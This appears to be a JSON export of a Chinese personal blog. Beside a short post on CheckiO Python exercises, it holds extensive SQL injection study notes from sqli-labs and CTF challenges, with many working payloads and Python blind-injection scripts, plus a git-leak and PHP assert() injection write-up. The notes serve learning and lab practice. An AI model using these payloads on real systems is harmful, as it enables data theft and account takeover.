{ return indexOf(elt) !== -1; } function checkAll(cb) { return function() { for (var i = watches.length - 1; i >= 0; i--) { cb.apply(this, watches[i]); } }; } return { add: add, remove: remove, isWatched: isWatched, checkAll: checkAll }; } function observeDOM(watches, container, cb) { var observer = new MutationObserver(watch); var filter = Array.prototype.filter; var concat = Array.prototype.concat; observer.observe(container, { childList: true, subtree: true, // changes like style/width/height/display will be catched attributes: true }); function watch(mutations) { // some new DOM nodes where previously watched // we should check their positions if (mutations.some(knownNodes) === true) { setTimeout(cb, 0); } } function knownNodes(mutation) { var nodes = concat.call([], Array.prototype.slice.call(mutation.addedNodes), mutation.target ); return filter.call(nodes, watches.isWatched).length > 0; } } /* WEBPACK VAR INJECTION */ }.call(exports, (function() { return this; }()))) /***/ } /******/ ]);"}],"posts":[{"title":"notes on checkio","slug":"notes-on-checkio","date":"2020-03-22T15:55:10.000Z","updated":"2020-03-23T12:28:22.715Z","comments":true,"path":"2020/03/22/notes-on-checkio/","link":"","permalink":"http://yoursite.com/2020/03/22/notes-on-checkio/","excerpt":"偶然发现了一个比较有意思的python\\java练习平台，叫做checkio，需要科学访问，目前做到的都是基础题，可以看到大佬的方法就很棒。","text":"偶然发现了一个比较有意思的python\\java练习平台，叫做checkio，需要科学访问，目前做到的都是基础题，可以看到大佬的方法就很棒。 all-the-same 列表元素比较比较列表元素是否全相同：用set();set() 函数创建一个无序不重复元素集，可进行关系测试，删除重复数据，还可以计算交集、差集、并集等。 1234567891011121314151617181920212223242526from typing import List, Anydef all_the_same(elements: List[Any]) -&gt; bool: # your code here a = set(elements) l = len(a) if l&lt;=1: return True else: return False return Trueif __name__ == &apos;__main__&apos;: print(&quot;Example:&quot;) print(all_the_same([1, 1, 1])) # These &quot;asserts&quot; are used for self-checking and not for an auto-testing assert all_the_same([1, 1, 1]) == True assert all_the_same([1, 2, 1]) == False assert all_the_same([&apos;a&apos;, &apos;a&apos;, &apos;a&apos;]) == True assert all_the_same([]) == True assert all_the_same([1]) == True print(&quot;Coding complete? Click &apos;Check&apos; to earn cool rewards!&quot;) 一个有意思的做法123def all_the_same(elements: List[Any]) -&gt; bool: # your code here return elements[1:] == elements[:-1] 这样就把所有元素都比较了一遍。 12345678elements=[1,2,3,4,5] print(elements[1:]) print(elements[:-1])[2, 3, 4, 5][1, 2, 3, 4][Finished in 0.1s]分别比较了 1&amp;2 2&amp;3 3&amp;4 4&amp;5 password 正则表达式检验密码安全性的要求： 10位数以上 至少包含：一个数字，一个大写字母，一个小写字母 字母或者数字直接用正则：re.match(&quot;^(?=.*[A-Z])(?=.*[a-z])(?=.*[0-9]){10,20}$&quot;,data)?=...:正向前视断言。也就是说匹配后面有…的字符串。 12345678910111213string=&apos;xun9er is a happy bug writer who likes writing bugs &apos; e=re.search(&quot;writ(?=er)&quot;,string)#正向前视断言f=re.search(&quot;writ(?!er)&quot;,string)#负向前视断言g=re.search(&quot;(?&lt;=b)u*&quot;,string)#正向后视断言print(e)print(f)print(g)----------------------------------------------&lt;re.Match object; span=(22, 26), match=&apos;writ&apos;&gt;&lt;re.Match object; span=(39, 43), match=&apos;writ&apos;&gt;&lt;re.Match object; span=(19, 20), match=&apos;u&apos;&gt; 正则表达式的先行断言(lookahead)和后行断言(lookbehind)此外re的几个函数： 1234567891011string=&apos;xun9er is a happy bug writer who likes writing bugs &apos; a=re.match(&quot;writ&quot;,string)#只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；b=re.search(&quot;writ&quot;,string)#匹配整个字符串，直到找到一个匹配。c=re.findall(&quot;writ&quot;,string)#返回string中所有与pattern相匹配的全部字串,返回值为列表。d=re.finditer(&quot;writ&quot;,string)#生成一个迭代器-------------------None&lt;re.Match object; span=(22, 26), match=&apos;writ&apos;&gt;[&apos;writ&apos;, &apos;writ&apos;]&lt;callable_iterator object at 0x0000024FAA1F6848&gt; dalao的做法123456789101112131415161718192021222324DIGIT_RE = re.compile(&apos;\\d&apos;)UPPER_CASE_RE = re.compile(&apos;[A-Z]&apos;)LOWER_CASE_RE = re.compile(&apos;[a-z]&apos;)def checkio(data): &quot;&quot;&quot; Return True if password strong and False if not A password is strong if it contains at least 10 symbols, and one digit, one upper case and one lower case letter. &quot;&quot;&quot; if len(data) &lt; 10: return False if not DIGIT_RE.search(data): return False if not UPPER_CASE_RE.search(data): return False if not LOWER_CASE_RE.search(data): return False return True compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"notes on sql injection","slug":"notes on sql injection","date":"2020-02-17T08:42:17.000Z","updated":"2020-03-23T12:33:57.806Z","comments":true,"path":"2020/02/17/notes on sql injection/","link":"","permalink":"http://yoursite.com/2020/02/17/notes on sql injection/","excerpt":"学习笔记，不定时更新。","text":"学习笔记，不定时更新。 var cnzz_protocol = ((\"https:\" == document.location.protocol) ? \"https://\" : \"http://\");document.write(unescape(\"%3Cspan style='display:none;' id='cnzz_stat_icon_1278295208'%3E%3C/span%3E%3Cscript src='\" + cnzz_protocol + \"s9.cnzz.com/z_stat.php%3Fid%3D1278295208%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E\")); sqlmysql靶场sqlmap首先要关代理，要不会报错。 12unable to connect to the target URL. sqlmap is going to retry the request(s)[15:22:42] [WARNING] if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with switch &apos;--random-agent&apos; and/or proxy switches (&apos;--ignore-proxy&apos;, &apos;--proxy&apos;,...) 命令摆这儿(sqlmap常用命令no.1)[https://www.cnblogs.com/-ying-/p/11759869.html] (sqlmap常用命令no.1)[https://www.jianshu.com/p/5ddc48c82958] sqli-lab需要注意的是php7会报错、php5.5默认不支持 MySQL 扩展，会报sql_connect错误。 一些散知识MySQL初始databaseMysql安装后默认会创建三个数据库：information_schema、mysql和test。mysql库中有用户信息 information_schemainformation_schema就像一个字典，可以在查里面查到所有数据库的信息。在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。 //information_schema里有很多表，具体：[MYSQL中information_schema简介]其中，information_schema库下的schemata表中保存着DBMS中的所有数据库名称信息(schema_name)。information_schema库下的tables表中有所有表名（table_name)。information_schema库下的columns表中有所有表对应的字段名。select group_concat(shema_name) from information_schema.schemataselect group_concat(table_name) from information_schema.tables where table_schema = database()用grop_concat()使所有数据连成一串显示，否则会报‘Unknown column ‘table_name’ in ‘field list’’错误。(https://www.jianshu.com/p/5903e8c002ed) 列出数据库所有表名、类型、使用的引擎select table_name, table_type, engine FROM information_schema.tables WHERE table_schema = ‘test’ ORDER BY table_name DESC; select 1作用：有时候为了提高效率，只是为了测试下某个表中是否存在记录，而不需要返回具体内容，就用1来代替。说明该表有五行信息。 where 1=1select * from table1 where 1=1后面加的‘where 1=1’的作用是让whre的条件变为永真，得到的结果就是未加约束条件的。注入时加入“or 1=1”就是使原本有约束的变为无约束查询:select * from table1 where name=&#39;123&#39; or 1=1深入理解SQL中where 1=1的用处 查询字段数（列数）方法1：order by 是用于通对结果集按照一个列或者多个列进行排序。但如果by后面直接跟数字，就以第几列来排序，当数字大于列数的时候会报错，以此来查询table列数。方法2：通过 union select 1,2,3..如果后面的1，2，3占的位数和查询表字段数不对应时会报错。并且通过这个可以确定字段显示位，可以通过显示位来显示想知道的信息。字段位中可加如下内置函数。 显示位(回显点)如果显示位的数量与实际查询的表的字段数不一样，会报如下错误：dvwa low sql injection通过测试知道其字段数为2；1&#39; union select user();# 报错：改为1&#39; union select user(),1;# 显示user信息（后面的1也可以是2、3…） mysql常见内置函数SQL注入常用的内置函数整理(以MySql为例) 注释mysql 服务器支持 # 到该行结束、– （后面有一个空格）到该行结束 以及 /* 行中间或多个行 */ 的注释方格一般会把#写成23%、– 写成–+ 匹配like 匹配/模糊匹配，会与 % 和 _ 结合使用。 '%a' //以a结尾的数据 'a%' //以a开头的数据 '%a%' //含有a的数据 '_a_' //三位且中间字母是a的 '_a' //两位且结尾字母是a的 'a_' //两位且开头字母是a的 eg: select * from table where like name ‘wsl%’; 更好地显示 逆序输出reverse()(在1FONLY dalao那里瞅到的) left() right() mid() 解决只显示数据一部分的情况，适用报错注入。比如：select right(password,34) from geek.H4rDsq1(geek hard injection) 把username和password用符号隔开 以某一输入的符号作为完整数据回显开始的标志在group_concat()里加入16进制ASCII码的符号或者用引号直接引用该符号（group_concat(username,”:”,password)）； 判断字符型or数字型 闭合 ‘或 “等 数字型可以通过计算式，如id=2/2返回id=2的结果 遇到的一些绕过方式 大写 比如 SelEct 重复 （关键字被替换为空的情况） 比如：sselectelect 注释符 ?id=1/**/union/**/select... 加&lt;&gt; 比如 1’ o&lt;&gt;r 1=1 过滤空格&emsp;1.用()把所有需要用空格分开的部分括起来&emsp;2.连接符 ?id=1++union++select++...所有都连起来 过滤“=”，用“like”替代 过滤 “and” ：用“or”或“^”(异或)或&amp;&amp;或|| 编码：hex,urlencode 注入方式多语句堆叠注入原理SQL语法以’;’作为一条SQL语句的结束。如果在一条语句结束的’;’后再加其他语句，如果加上的语句可以执行就形成堆叠注入。堆叠注入的语句可以是任意sql语句（没有过滤的话），比如：show databases; show columns from table;等等。 例子强网杯 2019 随便注 首先判断是否有注入。加上注释符号#后有回显，有sql注入。 order by查询列数，为3时报错，所以有两列数据。尝试用联合注入，但发现过滤了select。但是有很多没过滤，比如alter等。接下来就是堆叠注入啦：1’;show tables;#有两个表，分别是words 和 1919810931114514。分别查询两表的表结构。需要注意的是表名为数字的时候需要加上返单引号“`”。这里要结合最开始数据库回显的数据格式，仔细比较。words表内有两列数据，分别是int类型和varchar类型（和回显数据格式一样）；而1919810931114514表内应该就是放的flag。因此前端回显的就是words表。现在就需要想办法让其回显含有flag的表。先把原words表改名，再把含有flag的表更名成words，这样就可以顺利回显了。这个办法是真的神奇。 payload：’;rename table words to word;rename table 1919810931114514 to words;alter table words change flag id varchar(100);# union 联合查询注入union操作符用于合并两个或多个SELETC语句的结果集。UNION内部的SELECT语句必须拥有相同数量的列，列也必须拥有相似的数据类型。同时，每条,SELECT语句 cc中的列的顺序必须相同。默认情况下，UNION操作符选取不同的值，如果允许重复的值，请使用UNION ALL。 流程判断是否存在注入—&gt;字符型or整型—&gt;查询字段数—&gt;从information_schema 查表名、字段名—&gt;查找所需数据 注有的页面只回显查到的第一条记录输出，所以传入的第一的参数（union之前的参数）要写成查询不到的数据。eg：sqli-lap 报错注入意思就是当传入的参数使mysql里一些函数执行报错后返回报错信息，如果能构造参数使报错信息中带有数据库中的内容，则存在sql注入。 适用条件数据查询时，网页没有直接显示查询结果，输入错误时会有输入错误的提示。 判断是否存在注入通过在语句后增加逻辑判断（and 1=1、and 1=2），看当逻辑不对时是否报错，如果报错就说明对and后面的1=2进行了查询，也就存在注入。 xpath语法报错注入sql版本&gt;=5.1.5 涉及函数 extractvalue() EXTRACTVALUE (XML_document, XPath_string); 第一个参数：XML_document是String格式，为XML文档对象的名称。 第二个参数：XPath_string (Xpath格式的字符串). 作用：从目标XML中返回包含所查询值的字符串 ------------------------------------------ updatexml() UPDATEXML (XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) 第三个参数：new_value，String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点的值 extractvalue一般用法：SELECT extractvalue(&#39;&lt;a&gt;&lt;b&gt;x&lt;/b&gt;&lt;b&gt;y&lt;/b&gt;&lt;/a&gt;&#39;,&#39;/a/b&#39;) as result报错并返回错误信息(第二个参数出错)：SELECT extractvalue(&#39;&lt;a&gt;&lt;b&gt;x&lt;/b&gt;&lt;b&gt;y&lt;/b&gt;&lt;/a&gt;&#39;,&#39;#username&#39;) as result $sql=”SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1”;查询当前数据库的所有表名：paload:?id=1’ and extractvalue(1,concat(0x25,(select group_concat(table_name) from information_schema.tables where table_schema=database())))%23报错信息显示不全，在concat中查询信息之前加上一个符号作为查询返回信息的开始标志。 可以使用left() right() mid() UpdateXMLpayload：updatexml(1,concat(0x23,payload,0x23),1)MYSQL ExtractValue、UpdateXml报错注入详解 双查询注入指select里面再嵌套一个select。 涉及函数：concat():concat(str1,str2)将多个字符串连接成一个字符串。concat_ws():[concat with separator] concat_ws(separator,str1,str2)rand():随机生成一个0-1的数。 floor():向下取整。 count():聚合函数，返回符合条件的记录数量。 一般套路1select count(*),concat_ws(&apos;:&apos;,([子查询]，floor(rand()*2))) as a from [table_name] group by a 有大约50%的机率会出现报错，因为rand是取随机数。因此需要多刷几遍才可能得到报错信息。。 原理报错信息–duplicate entry…【重复条目（主键）】问题是出在了group by上面。group by 是将查询到的每列插入到临时表中，然后再排序。而这里的group by 用的是一个随机值，在查询时会计算一会floor(rand()* 2)。floor(random(0) * 2)可能为0，如果此时临时表只有key为1的行，不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。mysql中的group by用法 例子sqli-lab less-5数据库名： 1?id=1&apos; union select 1,count(*),concat_ws(&apos;:&apos;,(select database()),floor(rand()*2)) as a from information_schema.tables group by a --+ 如果想要100%报错则看情况修改rand() 为 rand(0)，小于0.5都可。改变查询语句，查表名： 1?id=1&apos; union select 1,count(*),concat_ws(&apos;:&apos;,(select concat(table_name) from information_schema.tables where table_schema=&apos;security&apos; limit 3,1),floor(rand()*2)) as a from information_schema.tables group by a --+ 需要注意的是这里需要通过limit来限制返回的行数。limit(3,1)表示第一个返回记录偏移量为3（第四行），限制返回1行。这里偏移量为3时可以查到名叫user的表。 依次查到username、password字段。 123?id=1&apos; union select 1,count(*),concat_ws(&apos;:&apos;,(select concat(column_name) from information_schema.columns where table_name=&apos;users&apos; limit 0,1 ),floor(rand()*2)) as a from information_schema.tables group by a --+?id=1&apos; union select 1,count(*),concat_ws(&apos;:&apos;,(select concat(column_name) from information_schema.columns where table_name=&apos;users&apos; limit 4,1 ),floor(rand()*2)) as a from information_schema.tables group by a --+ 查username、password 1?id=1&apos; union select 1,count(*),concat_ws(&apos;:&apos;,(select concat(username,&apos;:&apos;,password) from security.users limit 1,1),floor(rand()*2)) as a from information_schema.tables group by a --+ 12 参考：双查询注入原理mysql中的group by用法关于Mysql注入过程中的五种报错方式及具体利用案例 盲注基于布尔eg：当分别输入1、2时回显：Hello, glzjin wants a girlfriend.Do you want to be my girlfriend?翻到了源码那就贴上： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?php$dbuser=&apos;root&apos;;$dbpass=&apos;root&apos;;function safe($sql)&#123; #被过滤的内容 函数基本没过滤 $blackList = array(&apos; &apos;,&apos;||&apos;,&apos;#&apos;,&apos;-&apos;,&apos;;&apos;,&apos;&amp;&apos;,&apos;+&apos;,&apos;or&apos;,&apos;and&apos;,&apos;`&apos;,&apos;&quot;&apos;,&apos;insert&apos;,&apos;group&apos;,&apos;limit&apos;,&apos;update&apos;,&apos;delete&apos;,&apos;*&apos;,&apos;into&apos;,&apos;union&apos;,&apos;load_file&apos;,&apos;outfile&apos;,&apos;./&apos;); foreach($blackList as $blackitem)&#123; if(stripos($sql,$blackitem))&#123; return False; &#125; &#125; return True;&#125;if(isset($_POST[&apos;id&apos;]))&#123; $id = $_POST[&apos;id&apos;];&#125;else&#123; die();&#125;$db = mysql_connect(&quot;localhost&quot;,$dbuser,$dbpass);if(!$db)&#123; die(mysql_error());&#125; mysql_select_db(&quot;ctf&quot;,$db);if(safe($id))&#123; $query = mysql_query(&quot;SELECT content from passage WHERE id = $&#123;id&#125; limit 0,1&quot;); if($query)&#123; $result = mysql_fetch_array($query); if($result)&#123; echo $result[&apos;content&apos;]; &#125;else&#123; echo &quot;Error Occured When Fetch Result.&quot;; &#125; &#125;else&#123; var_dump($query); &#125;&#125;else&#123; die(&quot;SQL Injection Checked.&quot;);&#125; mysql IF(expr1,expr2,expr3)如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。当输入if(ascii(substr((select(flag)from(flag)),6,1))&gt;32,1,2)，如果查询成功则返回expr1（这里为1），若失败则返回expr2（这里为2），即成功回显“Hello, glzjin wants a girlfriend.”，失败则回显“Do you want to be my girlfriend?”，直接用Hello来代替。 脚本12345678910111213141516171819202122232425262728293031import requestsurl=&quot;http://c3a12b6f-097b-412e-ac9d-23895bff69b1.node3.buuoj.cn/index.php&quot;flag=&apos;&apos;#定义一个空字符串for i in range(1,50): low=32 high=126 mid=(low+high)//2## 二分法 while high&gt;low: print (high,mid,low) payload=&quot;(if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,2))&quot;.format(i,mid) data=&#123;&quot;id&quot;:payload&#125; r=requests.post(url,data=data) if &apos;Hello&apos; in r.text: low = mid+1 mid=(low+high)//2 else: high=mid mid=(low+high)//2 flag+=chr(mid)#将ascii值转为字符 print(flag) 极客大挑战2019 Final SQL过滤了超多：空格、and、or、database、if…if被过滤 可以用两个异或来替换if(重点)：用payload替换中间的那个1：若中间的判断为真（1），1^1^1=1,回显id=1的页面，即“NO! Not this! Click others~”；若为假（0），1^0^1=0,回显error页面。理清思路一切都简单了起来，把上面的脚本稍微改改就可。 基于时间和基于布尔类似，利用sleep()函数，当可以被执行时加载会延迟一会，时长为设定的时间，若没有被执行就会很快加载完成。此外benchmark()函数也可以实现延迟。BENCHMARK(count,expr)BENCHMARK会重复计算expr表达式count次，通过这种方式就可以评估出mysql执行这个expr表达式的效率。这个函数的返回值始终是0，但可以根据客户端提示的执行时间来得到BENCHMARK总共执行的所消耗的时间。 用法 通过是否有时间延迟来判断。 通过延迟时间的长短来猜解。其中sleep（）时间的长短会与查询到的数据相关： sqli-labs less-9 123?id=1 and sleep(3) --+?id=1&apos; and sleep(3) --+?id=1&quot; and sleep(3) --+ 1、3直接很快加载完成，2延迟了3秒。为字符型。判断长度：?id=1&#39; and if(length(database())&gt;1,sleep(3),0) %23 延迟了3秒 数据库名字：?id=1&#39; and if(ascii(substr((database()),1,1))&gt;1,sleep(3),0)%23 表名：?id=1&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1))&gt;1,sleep(3),0)%23 脚本先计算用户名的长度，再逐字提取数据。（后面爆表名没计算长度，偷懒了）这样有两个好处： 可以确定之后提取出来的数据是完整的，没有漏掉后面的东西； 可以通过其长度估算可能花费的时间。此外，单方面实现第一条也可以通过在搜集字符表中添加空字符串（这里用的escii码），当输出空字符串时即为数据名结尾。get：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110import requestsimport timeimport datetimeurl=&quot;http://localhost/sqli-labs-master/Less-9/&quot;#tabase_length:#判断长度用穷举法for i in range(1,15): payload=&quot;?id=1&apos; and if(length(database())&gt;&#123;&#125;,sleep(1),0) %23&quot;.format(i) print (payload) time1 = datetime.datetime.now() r=requests.get(url+payload+&quot;%23&quot;) time2 = datetime.datetime.now() time = (time2 - time1).seconds if time&gt;1: i+1 else: break print (&quot;database_name_lenth=&quot;,i)lenth=i#dabase_name:#判断名字用二分法database_name=&quot;&quot;for i in range(1,lenth): high = 128 low = 32 mid = (high+low)//2 while high&gt;low: payload=&quot;?id=1&apos; and if(ascii(substr((database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),0) %23&quot;.format(i,mid) print(payload) time1 = datetime.datetime.now() r = requests.get(url+payload+&quot;%23&quot;) time2=datetime.datetime.now() time = (time2-time1).seconds if time&gt;1: low = mid+1 mid = (high+low)//2 else : high = mid mid = (high+low)//2 database_name += chr(mid) print(chr(mid)) print(&quot;database_name:&quot;,database_name)# 爆表名tables_name=&quot;&quot;for n in range(0,10):#limit每次显示的地方 table_name=&quot;&quot; for i in range(1,10): high = 128 low = 32 mid = (high+low)//2 while high&gt;low: payload=&quot;?id=1&apos; and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit &#123;&#125;,1),&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),0)%23&quot;.format(n,i,mid) print(payload) time1 = datetime.datetime.now() r = requests.get(url+payload+&quot;%23&quot;) time2=datetime.datetime.now() time = (time2-time1).seconds if time&gt;=1: low = mid+1 mid = (high+low)//2 else : high = mid mid = (high+low)//2 table_name += chr(mid) print(chr(mid)) tables_name = tables_name+table_name+&quot; &quot; print(&quot;tables_name:&quot;,tables_name)# 后面就和爆表名差不多的格式 post方法类似,改为data传输数据。 总结： 基于布尔的盲注适用于没有报错提示但可以在前端返回一些查询内容或者执行与不执行时返回页面有差异的情况。 基于时间的盲注适合没有报错提示、不管是否执行了查询都返回一样的页面的情况，适合布尔的也可以用时间，但时间注入慢一点。 二次排序注入（储存型注入）指首先把含有恶意代码的数据上传到数据库里进行储存，再通过其他方式来请求该数据，导致恶意代码执行。 seriers-24该页面可以注册账户并登陆后修改密码。基本都用了mysql_real_escape_string()来转义。pass_changee.php中： 123456789101112131415161718192021222324252627&#123; # Validating the user input........ $username= $_SESSION[&quot;username&quot;]; //&lt;------直接从session中获取username未过滤。 $curr_pass= mysql_real_escape_string($_POST[&apos;current_password&apos;]); $pass= mysql_real_escape_string($_POST[&apos;password&apos;]); $re_pass= mysql_real_escape_string($_POST[&apos;re_password&apos;]); if($pass==$re_pass) &#123; $sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;; $res = mysql_query($sql) or die(&apos;You tried to be smart, Try harder!!!! :( &apos;); $row = mysql_affected_rows(); echo &apos;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;&lt;center&gt;&apos;; if($row==1) &#123; echo &quot;Password successfully updated&quot;; &#125; else &#123; header(&apos;Location: failed.php&apos;); //echo &apos;You tried to be smart, Try harder!!!! :( &apos;; &#125; &#125; mysql_real_escape_string：转义特殊字符，包括：\\x00 \\n \\r \\ ‘ “ \\x1a$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;让查询时只对比username而不管curr_pass，就可以修改任意已知用户名的账号。所以就要让查询语句从username后面截断。 注册admin’#账户，密码查询修改语句变为：$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39; &quot;; 修改密码后可以用新密码登录admin账户。 sqli_labseries-3 single quotes with twist源码： 1$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;; 闭合： ?id=1’)%23联合查询查字段：?id=-1’) union select 1,2,3%23到4时报错查当前数据库名：?id=-1’) union select 1,2,database()%23查当前数据库的所有表名：?id=-1’) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23 查所需（这里是users）表的所有字段:?id=-1’) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’ %23查想要的信息：?id=-1’) union select 1,2,concat(0x25,group_concat(username,0x3a,password)) from users %23 series-17 修改数据的报错注入（UPDATE）头铁的我一直抓着uname项来注入，后来才知道注入点在passwd。。。？？看了源码发现是因为首先查询username时结果集要有东西，如果用uname报错注入，结果集就为空，为空的时候会返回../images/slap1.jpg的那个页面。 updateUPDATE table_name SET field1=new-value1, field2=new-value2[WHERE Clause] 此处源码查询的语句：123456789@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;....$row = mysql_fetch_array($result);//从结果集中取得一行作为关联数组，或数字数组，或二者兼有//echo $row;$row1 = $row[&apos;username&apos;]; //echo &apos;Your Login name:&apos;. $row1; $update=&quot;UPDATE users SET password = &apos;$passwd&apos; WHERE username=&apos;$row1&apos;&quot;; mysql_query($update); echo &quot;&lt;br&gt;&quot;; 在结果集里查询username，如果有就将其对应password修改成输入的值。 payload：uname=admin&#39;and extractvalue(1,concat(&quot;~&quot;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot;~&quot;))#&amp;passwd=123]&amp;submit=Submit serise-18/19/20 插入语句 （INSERT INTO）、请求头注入INSERT INTO用于向数据表插入一行数据。比如：INSERT INTO Customers (CustomerName, City, Country)VALUES (‘Cardinal’, ‘Stavanger’, ‘Norway’); 源码1234567$uagent = $_SERVER[&apos;HTTP_USER_AGENT&apos;]; $IP = $_SERVER[&apos;REMOTE_ADDR&apos;];.....$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) userVALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;; mysql_query($insert); 方法less18 修改user-agent的数据为：&#39;and extractvalue(1,concat(&quot;~&quot;,(select database()),&quot;~&quot;)) and &#39;1&#39;=&#39;1less19 修改referer：Referer: &#39; and extractvalue(1,concat(&quot;~&quot;,(select database()),&quot;~&quot;)) and &#39;1&#39;=&#39;1less20 修改cookie：Cookie: uname=-1&#39; and extractvalue(1,concat(&quot;~&quot;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot;~&quot;)) and &#39;1&#39;=&#39;1需要注意的是： insert into 注入的话需要闭合前后的“’”; 此处需要用正确的用户名和密码。 21 22对输入的内容进行了base64编码。serise-23过滤截断符号： 12345678910if(isset($_GET[&apos;id&apos;]))&#123;$id=$_GET[&apos;id&apos;];//filter the comments out so as to comments should not work$reg = &quot;/#/&quot;;$reg1 = &quot;/--/&quot;;$replace = &quot;&quot;;$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id); 用永真查询以及&#39;1&#39;=&#39;1闭合单引号。参考： MYSQL中information_schema简介mysql中table schema的基本操作MySQL教程之concat以及group_concat的用法SQL Injection8(堆叠注入)——强网杯2019随便注mysql对xml提供支持的两个函数extractvalue updatexml报错注入的原理分析MYSQL BENCHMARK()函数一篇文章带你深入理解 SQL 盲注《SQL注入攻击与防御》","categories":[],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://yoursite.com/tags/sql注入/"}]},{"title":"Web source code leak","slug":"Web-source-code-leak","date":"2020-02-08T08:45:30.000Z","updated":"2020-02-08T08:46:11.849Z","comments":true,"path":"2020/02/08/Web-source-code-leak/","link":"","permalink":"http://yoursite.com/2020/02/08/Web-source-code-leak/","excerpt":"网页源码泄露大佬列举了好多：.git源码泄露、.svn源码泄露、DS_Store 文件泄露、.hg 源码泄露、常见编辑器备份文件泄露、WEB-INF/web.xml泄露、网站备份文件泄露、cvs文件泄露……这里记录一些遇到的，这样以后就可以不断完善啦","text":"网页源码泄露大佬列举了好多：.git源码泄露、.svn源码泄露、DS_Store 文件泄露、.hg 源码泄露、常见编辑器备份文件泄露、WEB-INF/web.xml泄露、网站备份文件泄露、cvs文件泄露……这里记录一些遇到的，这样以后就可以不断完善啦 git泄露工具：githack工作原理解析.git/index文件，找到工程中所有的： ( 文件名，文件sha1 ) 去.git/objects/ 文件夹下下载对应的文件 zlib解压文件，按原始的目录结构写入源代码 命令GitHack.py http://XXXXXXXXXXX/.git/ python版本python2支持，python3一堆报错。所以python2、python3都一起安上吧，此外还有pip共存问题。参照Win10下python3和python2切换和 pip共存问题 题xctf买七位数的彩票，可以用钱买flag，但钱不够。题目下直接给了目录源码，应该可以通过git泄露来获取。在buy.js里有一段用来对比输入号码和中奖号码的函数。用的是弱类型比较。所以如果中奖号码全是非零的数字，而输入的‘数字’为true就可以中头等奖。抓包：改变json传输的数据为true，（注：true不加引号，不然就成了字符串）json的两种格式：1 对象格式：{“key1”:obj,”key2”:obj,”key3”:obj…}2 数组/集合格式：[obj,obj,obj…]多刷几次就有足够的钱买flag了。 hgame blog直接加./git 就可以找到GitHub上面的远程仓库。 xctf/.get可以看到目录文件，用githack下载源码文件。一个比较有用的源码文件里： &lt;?php if (isset($_GET[&apos;page&apos;])) { $page = $_GET[&apos;page&apos;]; } else { $page = &quot;home&quot;; } $file = &quot;templates/&quot; . $page . &quot;.php&quot;; // I heard &apos;..&apos; is dangerous! 一个没成功的绕过：?page=hahaha&apos;,&apos;a&apos;) === false&quot;) or phpinfo();# assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);//如果前一个值为真后一个值就不会再判断了 // TODO: Make this look nice 绕过：page=123&apos;) or phpinfo();# assert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;);//file_exists() 函数检查文件或目录是否存在。 ?&gt;or如果前一个值为真后一个值就不会再判断了，这里如果第一个为假那么执行第二个die()无论结果是真是假程序都会直接退出。 assert()和evaleval：(1)eval() 函数把字符串按照 PHP 代码来计算（计算=执行）。(2)该字符串必须是合法的 PHP 代码，且必须以分号结尾。(3)如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。assert:(1)是一个调试程序时经常使用的宏，在程序运行时它计算括号内的表达式，如果表达式为FALSE (0), 程序将报告错误，并终止执行。如果表达式不为0，则继续执行后面的语句。这个宏通常原来判断程序中是否出现了明显非法的数据，如果出现了终止程序以免导致严重后果，同时也便于查找错误。(2)如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 对第二个assert函数闭合并加上or后面的函数：123’) or print_r(file_get_contents(‘templates/flag.php’));#payload（url编码后）:123%27)+or+print_r(file_get_contents(%27templates%2fflag.php%27))%3b%23此外，php源码不在网页上直接显示，需要查看网页源码。 